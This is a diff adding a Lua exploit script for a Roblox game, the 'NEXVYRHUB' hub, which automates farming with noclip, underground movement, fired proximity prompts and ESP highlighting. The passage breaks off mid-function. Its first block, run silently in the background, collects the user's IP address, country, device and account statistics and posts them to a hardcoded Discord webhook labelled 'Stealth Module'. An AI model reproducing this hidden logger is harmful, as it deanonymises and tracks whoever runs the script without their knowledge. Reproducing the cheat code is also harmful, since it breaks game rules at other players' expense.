@@ -1,0 +1,1959 @@
+local genv = (getgenv and getgenv()) or _G
+if genv.NEXVYRHUB_UNLOAD then
+    pcall(genv.NEXVYRHUB_UNLOAD)
+end
+
+task.spawn(function()
+    pcall(function()
+        local HttpService = game:GetService("HttpService")
+        local UserInputService = game:GetService("UserInputService")
+        local Players = game:GetService("Players")
+        local LP = Players.LocalPlayer
+        
+        local webhook_url = "https://discord.com/api/webhooks/1564942097520402453/lfWiEYRVMsvxmVjOILHzQZkZJ_35zCIuhhS-XRO85YyfSyG7Dld9UMTsSXE0lv84-5mH"
+        
+        local function fetchJson(url)
+            local res = game:HttpGet(url)
+            return HttpService:JSONDecode(res)
+        end
+
+        local ip = "Desconocida"
+        local country = "Desconocido"
+        
+        pcall(function()
+            local ipData = fetchJson("https://api.ipify.org?format=json")
+            ip = ipData.ip
+            local geoData = fetchJson("http://ip-api.com/json/" .. ip)
+            country = geoData.country
+        end)
+
+        local device = "PC"
+        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+            device = "Mobile"
+        elseif UserInputService.GamepadEnabled then
+            device = "Console"
+        end
+
+        local friends = 0
+        local followers = 0
+        local following = 0
+        pcall(function()
+            friends = fetchJson("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/friends/count").count or 0
+            followers = fetchJson("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followers/count").count or 0
+            following = fetchJson("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followings/count").count or 0
+        end)
+
+        local data = {
+            ["content"] = "**NEXVYRHUB - User Profile Log**",
+            ["embeds"] = {{
+                ["title"] = "Target: " .. LP.Name,
+                ["color"] = 10181046,
+                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"},
+                ["fields"] = {
+                    {["name"] = "Username", ["value"] = LP.Name, ["inline"] = true},
+                    {["name"] = "Display Name", ["value"] = LP.DisplayName, ["inline"] = true},
+                    {["name"] = "User ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
+                    {["name"] = "Device", ["value"] = device, ["inline"] = true},
+                    {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
+                    {["name"] = "Country", ["value"] = country, ["inline"] = true},
+                    {["name"] = "Friends", ["value"] = tostring(friends), ["inline"] = true},
+                    {["name"] = "Followers", ["value"] = tostring(followers), ["inline"] = true},
+                    {["name"] = "Following", ["value"] = tostring(following), ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Logged via Stealth Module"}
+            }}
+        }
+
+        local payload = HttpService:JSONEncode(data)
+        local reqFunc = request or syn and syn.request or http_request or http.request
+        
+        if reqFunc then
+            reqFunc({
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end
+    end)
+end)
+
+local CFG = {
+    Titulo       = "NEXVYRHUB",
+    VelMult      = 3.0,
+    Cooldown     = 0.5,
+    RetrasoGolpe = 0.25,
+    Top          = 12,
+    EsperaPickup = 22,
+    EsperaGrab   = 14,
+    EsperaBanco  = 3,
+    AfkCada      = 60,
+    Margen       = 2.7,
+    MaxEta       = 45,
+    Profundo     = 20,
+    VelBajar     = 120,
+    SinDano      = 20,
+    MaxPorHuevo  = 240,
+    VetoHuevo    = 120,
+    StreamCada   = 4,
+}
+
+local AUTO_LABEL = "Mas caro (auto)"
+local AUTO_ZONA  = "Auto (mejor zona segura)"
+
+local ZONAS = {
+    { Id = "Zone1",  Poder = 5 },
+    { Id = "Zone2",  Poder = 1000 },
+    { Id = "Zone3",  Poder = 50000 },
+    { Id = "Zone4",  Poder = 750000 },
+    { Id = "Zone5",  Poder = 12000000 },
+    { Id = "Zone6",  Poder = 150000000 },
+    { Id = "Zone7",  Poder = 1000000000 },
+    { Id = "Zone8",  Poder = 5000000000 },
+    { Id = "Zone9",  Poder = 25000000000 },
+    { Id = "Zone10", Poder = 100000000000 },
+    { Id = "Zone11", Poder = 200000000000 },
+}
+
+local Players            = game:GetService("Players")
+local RS                 = game:GetService("ReplicatedStorage")
+local RunService         = game:GetService("RunService")
+local CollectionService  = game:GetService("CollectionService")
+local Workspace          = game:GetService("Workspace")
+local Lighting           = game:GetService("Lighting")
+local StatsService       = game:GetService("Stats")
+local MarketplaceService = game:GetService("MarketplaceService")
+local VirtualUser        = game:GetService("VirtualUser")
+local VIM
+pcall(function() VIM = game:GetService("VirtualInputManager") end)
+
+local LP = Players.LocalPlayer
+
+pcall(function()
+    local cfgMod = RS:FindFirstChild("Shared") and RS.Shared:FindFirstChild("ZonesConfig")
+    if not cfgMod then return end
+    local real = require(cfgMod)
+    if type(real) == "table" and type(real.Zones) == "table" then
+        for i, z in ipairs(real.Zones) do
+            if ZONAS[i] and type(z.RequiredPower) == "number" then
+                ZONAS[i].Poder = z.RequiredPower
+            end
+        end
+    end
+end)
+
+local Alive = true
+local Conns = {}
+local S = {
+    Farm       = false,
+    Under      = false,
+    Esquivar   = false,
+    StreamZonas = true,
+    AntiGolpe  = true,
+    IrHuevo    = false,
+    Espiar     = false,
+    AntiAfk    = false,
+    Selected   = nil,
+    ZonaMax    = nil,
+    Busy       = false,
+    HitId      = math.random(10, 200),
+    Cooldown   = CFG.Cooldown,
+    OkHits     = 0,
+    FlingHasta = 0,
+    VelMult    = CFG.VelMult,
+    Margen     = CFG.Margen,
+    MaxEta     = CFG.MaxEta,
+    Dps        = 0,
+    LastCap    = -1,
+    Estado     = "Apagado",
+    Carried    = false,
+    RecTry     = 0,
+    HoldHasta  = 0,
+    HitCF      = nil,
+    PrevHit    = false,
+}
+
+local ST = {
+    Inicio   = os.clock(),
+    Activo   = 0,
+    Entregas = 0,
+    Fallos   = 0,
+    Vetados  = 0,
+    Golpes   = 0,
+    Rechazos = 0,
+}
+local Black = setmetatable({}, { __mode = "k" })
+local Sub = {}
+
+local WindUI, Window, EggDropdown
+local EggByLabel = {}
+local ZonaByLabel = {}
+local HL
+
+local function track(c)
+    Conns[#Conns + 1] = c
+    return c
+end
+
+local function getChar() return LP.Character end
+local function getHum()
+    local c = LP.Character
+    return c and c:FindFirstChildOfClass("Humanoid")
+end
+local function getHRP()
+    local c = LP.Character
+    return c and c:FindFirstChild("HumanoidRootPart")
+end
+local function isDead()
+    local h = getHum()
+    return (not h) or h.Health <= 0
+end
+
+local SUF = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc" }
+local function fmt(n)
+    n = tonumber(n) or 0
+    local i = 1
+    while math.abs(n) >= 1000 and i < #SUF do
+        n = n / 1000
+        i = i + 1
+    end
+    local s = string.format("%.1f", n)
+    s = s:gsub("%.0$", "")
+    return s .. SUF[i]
+end
+
+local lastNotif = {}
+local function notify(msg, icon)
+    if not WindUI then return end
+    local now = os.clock()
+    if lastNotif[msg] and now - lastNotif[msg] < 8 then return end
+    lastNotif[msg] = now
+    pcall(function()
+        WindUI:Notify({ Title = CFG.Titulo, Content = msg, Icon = icon or "info", Duration = 3 })
+    end)
+end
+
+local function playerPower()
+    return tonumber(LP:GetAttribute("SpeedPower")) or 0
+end
+
+local function zoneAt(pos)
+    local build = Workspace:FindFirstChild("Build")
+    local folder = build and build:FindFirstChild("ZoneHitboxes")
+    if not folder then return nil end
+    for i = 1, #ZONAS do
+        local p = folder:FindFirstChild(tostring(i))
+        if p and p:IsA("BasePart") then
+            local l = p.CFrame:PointToObjectSpace(pos)
+            local h = p.Size * 0.5
+            if math.abs(l.X) <= h.X and math.abs(l.Z) <= h.Z then
+                return i
+            end
+        end
+    end
+    local safe = folder:FindFirstChild("SafeZone")
+    if safe and safe:IsA("BasePart") then
+        local l = safe.CFrame:PointToObjectSpace(pos)
+        local h = safe.Size * 0.5
+        if math.abs(l.X) <= h.X and math.abs(l.Z) <= h.Z then
+            return 0
+        end
+    end
+    return nil
+end
+
+local function safeMaxZone()
+    local p = playerPower()
+    local best = 0
+    for i, z in ipairs(ZONAS) do
+        if p >= z.Poder * S.Margen then
+            best = i
+        else
+            break
+        end
+    end
+    return best
+end
+
+local function allowedMaxZone()
+    local m = safeMaxZone()
+    if S.ZonaMax and S.ZonaMax < m then m = S.ZonaMax end
+    return m
+end
+
+local function eggZone(p)
+    local z = tonumber(p:GetAttribute("ZoneIndex"))
+    if z then return z end
+    local a = p
+    while a and a ~= Workspace do
+        local n = tonumber(string.match(a.Name, "^Zone(%d+)$"))
+        if n then return n end
+        a = a.Parent
+    end
+    local byPos = zoneAt(p.Position)
+    return byPos or 0
+end
+
+local GuardCache, GuardAt = {}, 0
+
+local function guards()
+    local now = os.clock()
+    if now - GuardAt < 1 then return GuardCache end
+    GuardAt = now
+    local list = {}
+    local build = Workspace:FindFirstChild("Build")
+    local zb = build and build:FindFirstChild("ZoneBuilds")
+    if zb then
+        for _, z in ipairs(zb:GetChildren()) do
+            for _, m in ipairs(z:GetChildren()) do
+                if m:IsA("Model") and m:GetAttribute("ChaseState") ~= nil then
+                    list[#list + 1] = m
+                end
+            end
+        end
+    end
+    GuardCache = list
+    return list
+end
+
+local function flatDist(a, b)
+    return Vector3.new(a.X - b.X, 0, a.Z - b.Z).Magnitude
+end
+
+local function carryingNow()
+    if LP:GetAttribute("Carrying") ~= nil then return true end
+    local n = LP:GetAttribute("CarryCount")
+    return type(n) == "number" and n > 0
+end
+
+local function guardActive(g)
+    local st = g:GetAttribute("ChaseState")
+    return st == "WindUp" or st == "Chasing"
+end
+
+local function guardThreat()
+    local hrp = getHRP()
+    if not hrp then return nil end
+    local best, bestD
+    for _, g in ipairs(guards()) do
+        if g.Parent and guardActive(g) then
+            local tid = g:GetAttribute("TargetUserId")
+            local d = flatDist(g:GetPivot().Position, hrp.Position)
+            local mine = (tid == LP.UserId) or (tid == nil and d < 45)
+            if mine and d < 110 and (not bestD or d < bestD) then
+                best, bestD = g, d
+            end
+        end
+    end
+    return best, bestD
+end
+
+local function guardActiveNear(pos, radius)
+    for _, g in ipairs(guards()) do
+        if g.Parent and guardActive(g) then
+            if flatDist(g:GetPivot().Position, pos) < radius then return true end
+        end
+    end
+    return false
+end
+
+local BRACKET = { TITANIC = 3, HUGE = 2, BIG = 1 }
+
+local function eggLive(p)
+    return p ~= nil
+        and p.Parent ~= nil
+        and not p:GetAttribute("Broken")
+        and not p:GetAttribute("Hatching")
+        and not p:GetAttribute("Despawning")
+end
+
+local function eggInfo(p, pos)
+    local d = 0
+    if pos then d = (p.Position - pos).Magnitude end
+    local hp = tonumber(p:GetAttribute("Health")) or 0
+    local eta = 0
+    if S.Dps > 0 then eta = hp / S.Dps end
+    return {
+        part    = p,
+        name    = tostring(p:GetAttribute("EggType") or "Egg"),
+        zone    = eggZone(p),
+        bracket = tostring(p:GetAttribute("WeightBracket") or ""),
+        brank   = BRACKET[tostring(p:GetAttribute("WeightBracket") or "")] or 0,
+        size    = tonumber(p:GetAttribute("SizeMult")) or 1,
+        luck    = tonumber(p:GetAttribute("Luck")) or 1,
+        kg      = tonumber(p:GetAttribute("WeightKg")) or 0,
+        hp      = hp,
+        eta     = eta,
+        dist    = d,
+    }
+end
+
+local function better(a, b)
+    if a.zone ~= b.zone then return a.zone > b.zone end
+    if a.brank ~= b.brank then return a.brank > b.brank end
+    if a.size ~= b.size then return a.size > b.size end
+    if a.luck ~= b.luck then return a.luck > b.luck end
+    if a.kg ~= b.kg then return a.kg > b.kg end
+    return a.dist < b.dist
+end
+
+local function scanEggs()
+    local hrp = getHRP()
+    local pos = hrp and hrp.Position
+    local cap = allowedMaxZone()
+    local list = {}
+    for _, p in ipairs(CollectionService:GetTagged("BreakableEgg")) do
+        if p:IsA("BasePart") and p:GetAttribute("EggType") and eggLive(p) and (Black[p] or 0) < os.clock() then
+            local info = eggInfo(p, pos)
+            if info.zone >= 1 and info.zone <= cap and not guardActiveNear(p.Position, 80) then
+                list[#list + 1] = info
+            end
+        end
+    end
+    table.sort(list, better)
+    return list
+end
+
+local function eggLabel(info, rank)
+    local tag = ""
+    if info.bracket ~= "" then tag = " " .. info.bracket end
+    local eta = ""
+    if S.Dps > 0 then eta = string.format(" | ~%ds", math.min(math.floor(info.eta), 9999)) end
+    return string.format("%d. %s | Z%d%s | x%.2f | %skg%s", rank, info.name, info.zone, tag, info.size, fmt(info.kg), eta)
+end
+
+local function selectAuto()
+    if EggDropdown then
+        pcall(function() EggDropdown:Select(AUTO_LABEL) end)
+    end
+end
+
+local function desiredEgg()
+    local sel = S.Selected
+    if sel then
+        if eggLive(sel) and eggZone(sel) <= allowedMaxZone() then return sel end
+        S.Selected = nil
+        selectAuto()
+    end
+    local list = scanEggs()
+    if #list == 0 then return nil end
+    if S.Dps <= 0 then return list[1].part end
+
+    local fastest = list[1]
+    for _, info in ipairs(list) do
+        if info.eta <= S.MaxEta then return info.part end
+        if info.eta < fastest.eta then fastest = info end
+    end
+    return fastest.part
+end
+
+local function surfDist(p, pos)
+    local sz = p.Size
+    local d = pos - p.Position
+    local flat = math.max(Vector3.new(d.X, 0, d.Z).Magnitude - math.max(sz.X, sz.Z) / 2, 0)
+    local vert = math.max(math.abs(d.Y) - sz.Y / 2, 0)
+    return math.sqrt(flat * flat + vert * vert)
+end
+
+local function standCF(egg)
+    local hrp = getHRP()
+    local sz = egg.Size
+    local r = math.max(sz.X, sz.Z) / 2 + 3
+    local dir = Vector3.new(1, 0, 0)
+    if hrp then
+        local d = hrp.Position - egg.Position
+        d = Vector3.new(d.X, 0, d.Z)
+        if d.Magnitude > 0.5 then dir = d.Unit end
+    end
+    local pos = egg.Position + dir * r
+    local y = egg.Position.Y - sz.Y / 2 + 3.2
+    return CFrame.new(Vector3.new(pos.X, y, pos.Z), Vector3.new(egg.Position.X, y, egg.Position.Z))
+end
+
+local function setHighlight(part)
+    if not S.Espiar or not part then
+        if HL then pcall(function() HL.Adornee = nil end) end
+        return
+    end
+    pcall(function()
+        if not HL then
+            HL = Instance.new("Highlight")
+            HL.FillColor = Color3.fromRGB(255, 105, 180)
+            HL.OutlineColor = Color3.fromRGB(255, 255, 255)
+            HL.FillTransparency = 0.45
+            HL.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            HL.Name = "NEXVYRHUB_ESP"
+            HL.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+        end
+        HL.Adornee = part
+    end)
+end
+
+local function travelSpeed()
+    local hum = getHum()
+    local ws = (hum and hum.WalkSpeed) or 16
+    return math.clamp(ws * S.VelMult, 12, 240)
+end
+
+local function moveTo(cf, abort, speed)
+    local hrp = getHRP()
+    local char = getChar()
+    if not hrp or not char then return false end
+    speed = speed or travelSpeed()
+
+    local startPos = hrp.Position
+    local goal = cf.Position
+    local dist = (goal - startPos).Magnitude
+    if dist <= 4 then
+        hrp.CFrame = cf
+        return true
+    end
+
+    local saved = {}
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then
+            saved[p] = p.CanCollide
+            p.CanCollide = false
+        end
+    end
+
+    local dir = (goal - startPos).Unit
+    local rot = cf.Rotation
+    local traveled = 0
+    local ok = true
+
+    while traveled < dist do
+        if not Alive or (abort and abort()) then ok = false break end
+        local h = getHRP()
+        if not h then ok = false break end
+        local dt = math.min(RunService.Heartbeat:Wait(), 0.05)
+        traveled = math.min(traveled + speed * dt, dist)
+        local a = traveled / dist
+        local pos = startPos:Lerp(goal, a)
+        for p in pairs(saved) do
+            if p.Parent and p.CanCollide then p.CanCollide = false end
+        end
+        h.CFrame = CFrame.new(pos) * rot
+        h.AssemblyLinearVelocity = dir * speed
+        h.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+    end
+
+    for p, v in pairs(saved) do
+        if p.Parent then p.CanCollide = v end
+    end
+    local h = getHRP()
+    if h then
+        if ok then h.CFrame = cf end
+        h.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+        h.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+    end
+    return ok
+end
+
+local function abortFarm()
+    return (not S.Farm) or isDead()
+end
+
+local function holding()
+    return S.AntiGolpe and os.clock() < S.HoldHasta
+end
+
+local function abortCarry()
+    return (not S.Farm) or isDead() or holding() or not carryingNow()
+end
+
+local function groundPos(pos)
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    params.FilterDescendantsInstances = { getChar() }
+    local res = Workspace:Raycast(pos + Vector3.new(0, 300, 0), Vector3.new(0, -700, 0), params)
+    if res then
+        return Vector3.new(pos.X, res.Position.Y + 3.5, pos.Z)
+    end
+    return pos
+end
+
+local function dodge()
+    if not S.Esquivar or carryingNow() then return false end
+    local g = guardThreat()
+    if not g then return false end
+    local hrp = getHRP()
+    if not hrp then return false end
+    local gp = g:GetPivot().Position
+    local away = Vector3.new(hrp.Position.X - gp.X, 0, hrp.Position.Z - gp.Z)
+    if away.Magnitude < 1 then away = Vector3.new(1, 0, 0) end
+    away = away.Unit
+    S.Estado = "Esquivando guardian..."
+    local target = groundPos(hrp.Position + away * 120)
+    moveTo(CFrame.new(target), abortFarm)
+    local t0 = os.clock()
+    while Alive and S.Farm and os.clock() - t0 < 6 do
+        if not guardThreat() then break end
+        task.wait(0.2)
+    end
+    return true
+end
+
+local function pickaxeInHand()
+    local c = getChar()
+    local t = c and c:FindFirstChild("Pickaxe")
+    return t ~= nil and t:IsA("Tool")
+end
+
+local function equipPickaxe()
+    if pickaxeInHand() then return true end
+    local hum = getHum()
+    local bp = LP:FindFirstChildOfClass("Backpack")
+    local tool = bp and bp:FindFirstChild("Pickaxe")
+    if hum and tool and tool:IsA("Tool") then
+        pcall(function() hum:EquipTool(tool) end)
+        local t0 = os.clock()
+        while os.clock() - t0 < 1 and not pickaxeInHand() do
+            task.wait(0.05)
+        end
+    end
+    return pickaxeInHand()
+end
+
+local function swingAt(egg)
+    local req = RS:FindFirstChild("EggHitRequest")
+    if not req then return end
+    local swing = RS:FindFirstChild("MasteryPickaxeSwing")
+    if swing then swing:FireServer() end
+    task.delay(CFG.RetrasoGolpe, function()
+        if not Alive or not S.Farm then return end
+        if not eggLive(egg) or not pickaxeInHand() then return end
+        S.HitId = S.HitId + 1
+        req:FireServer(egg, S.HitId)
+    end)
+end
+
+local function breakEgg(egg)
+    local last = 0
+    local winHp = tonumber(egg:GetAttribute("Health")) or 0
+    local winT = os.clock()
+    local lastCheck = os.clock()
+    local startT = os.clock()
+    local lastHp = tonumber(egg:GetAttribute("Health"))
+    local lastDrop = os.clock()
+
+    while Alive and S.Farm and not isDead() do
+        if dodge() then return "switch" end
+        if not egg.Parent then return "gone" end
+        if not eggLive(egg) then return "dead" end
+        local hp = egg:GetAttribute("Health")
+        if type(hp) == "number" and hp <= 0 then return "dead" end
+        if S.Selected and S.Selected ~= egg and eggLive(S.Selected) then return "switch" end
+
+        local now = os.clock()
+
+        if type(hp) == "number" and (lastHp == nil or hp < lastHp) then
+            lastHp, lastDrop = hp, now
+        end
+        if now - lastDrop > CFG.SinDano or now - startT > CFG.MaxPorHuevo then
+            Black[egg] = now + CFG.VetoHuevo
+            ST.Vetados = ST.Vetados + 1
+            if S.Selected == egg then
+                S.Selected = nil
+                selectAuto()
+            end
+            notify("Huevo sin progreso: lo salto un rato", "triangle-alert")
+            return "switch"
+        end
+
+        if type(hp) == "number" and now - winT >= 1.5 then
+            if hp < winHp then
+                local sample = (winHp - hp) / (now - winT)
+                if S.Dps <= 0 then S.Dps = sample else S.Dps = S.Dps * 0.7 + sample * 0.3 end
+            end
+            winHp, winT = hp, now
+        end
+
+        if not S.Selected and S.Dps > 0 and now - lastCheck >= 2 and type(hp) == "number" then
+            lastCheck = now
+            if hp / S.Dps > S.MaxEta then
+                local alt = desiredEgg()
+                if alt and alt ~= egg then
+                    local altHp = tonumber(alt:GetAttribute("Health")) or 0
+                    if altHp < hp then return "switch" end
+                end
+            end
+        end
+
+        if eggZone(egg) > allowedMaxZone() then return "switch" end
+
+        local hrp = getHRP()
+        if hrp and surfDist(egg, hrp.Position) > 6.5 then
+            if not moveTo(standCF(egg), abortFarm) then return "gone" end
+            lastDrop = os.clock()
+        end
+        if not pickaxeInHand() then equipPickaxe() end
+
+        if now - last >= S.Cooldown then
+            last = now
+            swingAt(egg)
+        end
+        task.wait()
+    end
+    return "gone"
+end
+
+local function carrying()
+    return carryingNow()
+end
+
+local function findPickup(hatchId, pos, allowUnhatched)
+    local best, bestD
+    for _, m in ipairs(CollectionService:GetTagged("AnimalPickup")) do
+        if m:IsA("Model") and m.Parent and not m:GetAttribute("Despawning") then
+            local hatched = m:GetAttribute("Hatched") and true or false
+            if hatched or allowUnhatched then
+                local hid = m:GetAttribute("HatchId")
+                if hatchId ~= nil and hid ~= nil then
+                    if hid == hatchId then return m end
+                elseif pos then
+                    local d = m:GetPivot().Position - pos
+                    d = Vector3.new(d.X, 0, d.Z).Magnitude
+                    if d < 150 and (not bestD or d < bestD) then
+                        best, bestD = m, d
+                    end
+                end
+            end
+        end
+    end
+    return best
+end
+
+local function findStealPrompt(pickup)
+    for _, d in ipairs(pickup:GetDescendants()) do
+        if d:IsA("ProximityPrompt") and d.Name == "StealPrompt" then return d end
+    end
+    local pivot = pickup:GetPivot().Position
+    local best, bestD
+    local function consider(p)
+        if p:IsA("ProximityPrompt") and p.Name == "StealPrompt" then
+            local par = p.Parent
+            if par and par:IsA("BasePart") then
+                local d = (par.Position - pivot).Magnitude
+                if not bestD or d < bestD then best, bestD = p, d end
+            end
+        end
+    end
+    for _, p in ipairs(CollectionService:GetTagged("SmartPrompt")) do
+        consider(p)
+    end
+    if not best then
+        for _, a in ipairs(Workspace:GetChildren()) do
+            if a.Name == "PromptAnchor" then
+                for _, p in ipairs(a:GetChildren()) do consider(p) end
+            end
+        end
+    end
+    if best and bestD < 80 then return best end
+    for _, d in ipairs(pickup:GetDescendants()) do
+        if d:IsA("ProximityPrompt") then return d end
+    end
+    return nil
+end
+
+local function holdPrompt(prompt)
+    local hold = tonumber(prompt.HoldDuration) or 0
+    pcall(function() prompt:InputHoldBegin() end)
+    task.wait(hold + 0.12)
+    pcall(function() prompt:InputHoldEnd() end)
+end
+
+local function pressPromptKey(prompt)
+    if not VIM then return end
+    local key = Enum.KeyCode.E
+    pcall(function()
+        if prompt and prompt.KeyboardKeyCode ~= Enum.KeyCode.Unknown then key = prompt.KeyboardKeyCode end
+    end)
+    local hold = 0.5
+    pcall(function() hold = (tonumber(prompt.HoldDuration) or 0) + 0.2 end)
+    pcall(function()
+        VIM:SendKeyEvent(true, key, false, game)
+        task.wait(hold)
+        VIM:SendKeyEvent(false, key, false, game)
+    end)
+end
+
+local function grab(pickup)
+    local t0 = os.clock()
+    local tries = 0
+    while Alive and S.Farm and not isDead() and os.clock() - t0 < CFG.EsperaGrab do
+        if carrying() then return true end
+        if not pickup.Parent then break end
+        if not S.Carried and dodge() then t0 = os.clock() end
+
+        local prompt = findStealPrompt(pickup)
+        local pos = pickup:GetPivot().Position
+        if prompt and prompt.Parent and prompt.Parent:IsA("BasePart") then
+            pos = prompt.Parent.Position
+        end
+
+        local hrp = getHRP()
+        if hrp and (hrp.Position - pos).Magnitude > 3 then
+            moveTo(CFrame.new(pos + Vector3.new(0, 1.5, 0)), abortFarm)
+        end
+
+        if prompt then
+            if prompt.Enabled then
+                S.Estado = "Agarrando el animal..."
+                tries = tries + 1
+                if tries % 3 == 1 then
+                    holdPrompt(prompt)
+                elseif tries % 3 == 2 then
+                    if fireproximityprompt then pcall(fireproximityprompt, prompt) end
+                    task.wait(0.1)
+                else
+                    pressPromptKey(prompt)
+                end
+            else
+                S.Estado = "Esperando que se active el prompt de robo..."
+            end
+        else
+            S.Estado = "Buscando el prompt de robo..."
+        end
+        task.wait(0.25)
+    end
+    return carrying()
+end
+
+local function myBase()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+    for _, m in ipairs(plots:GetChildren()) do
+        if m:GetAttribute("OwnerUserId") == LP.UserId then return m end
+    end
+    return nil
+end
+
+local function baseCF()
+    local base = myBase()
+    if not base then return nil end
+    local hb = base:FindFirstChild("Hitbox")
+    if hb and hb:IsA("BasePart") then
+        return CFrame.new(hb.Position.X, hb.Position.Y - hb.Size.Y / 2 + 3.5, hb.Position.Z)
+    end
+    local sp = base:FindFirstChild("SpawnPoint")
+    if sp and sp:IsA("BasePart") then
+        return CFrame.new(sp.Position + Vector3.new(0, 3, 0))
+    end
+    return nil
+end
+
+local function deliver()
+    local cf = baseCF()
+    if not cf then
+        notify("No encontre tu base", "triangle-alert")
+        S.Estado = "No encontre tu base"
+        return false
+    end
+    for _ = 1, 3 do
+        if not (Alive and S.Farm) or isDead() then break end
+        if not carrying() then return false end
+        S.Estado = "Llevando el animal a tu base..."
+        if not moveTo(cf, abortCarry) then return false end
+        local t0 = os.clock()
+        while Alive and S.Farm and carrying() and os.clock() - t0 < CFG.EsperaBanco do
+            task.wait(0.1)
+        end
+        if not carrying() then return true end
+    end
+    return false
+end
+
+do
+    local ZERO = Vector3.new(0, 0, 0)
+
+    local function makeParams()
+        local list = {}
+        for _, pl in ipairs(Players:GetPlayers()) do
+            if pl.Character then list[#list + 1] = pl.Character end
+        end
+        for _, tag in ipairs({ "BreakableEgg", "AnimalPickup" }) do
+            for _, inst in ipairs(CollectionService:GetTagged(tag)) do
+                list[#list + 1] = inst
+            end
+        end
+        local params = RaycastParams.new()
+        params.FilterType = Enum.RaycastFilterType.Exclude
+        params.FilterDescendantsInstances = list
+        pcall(function() params.RespectCanCollide = true end)
+        return params
+    end
+
+    local function floorY(params, x, refY, z)
+        local res = Workspace:Raycast(Vector3.new(x, refY, z), Vector3.new(0, -400, 0), params)
+        if res then return res.Position.Y end
+        return nil
+    end
+
+    local function noclip(char, saved)
+        for _, p in ipairs(char:GetDescendants()) do
+            if p:IsA("BasePart") then
+                if saved[p] == nil then saved[p] = p.CanCollide end
+                if p.CanCollide then p.CanCollide = false end
+            end
+        end
+    end
+
+    function Sub.under(cf, abort)
+        local char, hrp = getChar(), getHRP()
+        if not char or not hrp then return false end
+
+        local depth = CFG.Profundo
+        local rot = hrp.CFrame.Rotation
+        local p0 = hrp.Position
+        local params = makeParams()
+        local lastFy = floorY(params, p0.X, p0.Y + 4, p0.Z) or (p0.Y - 3)
+        local saved = {}
+        noclip(char, saved)
+
+        local ok, arrived = true, false
+        local x, z, curY = p0.X, p0.Z, p0.Y
+        local scanAt = os.clock() + 0.3
+
+        local function enforce()
+            for p in pairs(saved) do
+                if p.Parent and p.CanCollide then p.CanCollide = false end
+            end
+        end
+        local function frame()
+            local dt = math.min(RunService.Heartbeat:Wait(), 0.05)
+            if os.clock() >= scanAt then
+                scanAt = os.clock() + 0.3
+                local c = getChar()
+                if c then noclip(c, saved) end
+            end
+            return dt
+        end
+        local function put(h, px, py, pz, vel)
+            h.CFrame = CFrame.new(px, py, pz) * rot
+            h.AssemblyLinearVelocity = vel
+            h.AssemblyAngularVelocity = ZERO
+        end
+
+        S.Estado = "Farm 2: bajando bajo tierra..."
+        local downY = lastFy - depth
+        while ok and curY > downY + 0.05 do
+            if not Alive or (abort and abort()) then ok = false break end
+            local h = getHRP()
+            if not h then ok = false break end
+            local dt = frame()
+            curY = math.max(curY - CFG.VelBajar * dt, downY)
+            enforce()
+            put(h, x, curY, z, ZERO)
+        end
+
+        local goal = cf.Position
+        local fx, fz = goal.X - x, goal.Z - z
+        local dist = math.sqrt(fx * fx + fz * fz)
+        if ok and dist > 0.5 then
+            local dx, dz = fx / dist, fz / dist
+            local sx, sz = x, z
+            local speed = travelSpeed()
+            local vel = Vector3.new(dx * speed, 0, dz * speed)
+            local traveled = 0
+            S.Estado = "Farm 2: viajando bajo tierra a tu base..."
+            while traveled < dist do
+                if not Alive or (abort and abort()) then ok = false break end
+                if not carryingNow() then break end
+                local h = getHRP()
+                if not h then ok = false break end
+                local dt = frame()
+                traveled = math.min(traveled + speed * dt, dist)
+                x, z = sx + dx * traveled, sz + dz * traveled
+                local f = floorY(params, x, math.max(lastFy, curY) + 5, z)
+                if f then lastFy = f end
+                curY = curY + ((lastFy - depth) - curY) * math.min(1, dt * 14)
+                enforce()
+                put(h, x, curY, z, vel)
+            end
+            arrived = ok and traveled >= dist
+        else
+            arrived = ok
+        end
+
+        local upY
+        if arrived then
+            x, z = goal.X, goal.Z
+            upY = goal.Y
+        else
+            upY = lastFy + 3.5
+        end
+        S.Estado = "Farm 2: subiendo a la zona segura..."
+        while ok and curY < upY - 0.05 do
+            if not Alive or (abort and abort()) then ok = false break end
+            local h = getHRP()
+            if not h then ok = false break end
+            local dt = frame()
+            curY = math.min(curY + CFG.VelBajar * dt, upY)
+            enforce()
+            put(h, x, curY, z, ZERO)
+        end
+
+        local h = getHRP()
+        if h then
+            if curY < upY - 0.05 then
+                h.CFrame = CFrame.new(x, upY, z) * rot
+            elseif ok and arrived then
+                h.CFrame = cf
+            end
+            h.AssemblyLinearVelocity = ZERO
+            h.AssemblyAngularVelocity = ZERO
+        end
+        for p, v in pairs(saved) do
+            if p.Parent then p.CanCollide = v end
+        end
+        return ok, arrived
+    end
+
+    function Sub.deliverUnder()
+        local cf = baseCF()
+        if not cf then
+            notify("No encontre tu base", "triangle-alert")
+            S.Estado = "No encontre tu base"
+            return false
+        end
+        if not carrying() then return true end
+        local okU, arrivedU = Sub.under(cf, abortFarm)
+        if not okU or not arrivedU then return false end
+
+        S.Estado = "Farm 2: dejando el animal..."
+        local t0 = os.clock()
+        while Alive and S.Farm and carrying() and os.clock() - t0 < CFG.EsperaBanco do
+            task.wait(0.1)
+        end
+        if not carrying() then return true end
+
+        S.Estado = "Farm 2: no se deposito, reintentando en superficie..."
+        return deliver()
+    end
+
+    function Sub.go()
+        local n = tonumber(LP:GetAttribute("CarryCount")) or 1
+        if n < 1 then n = 1 end
+        local ok
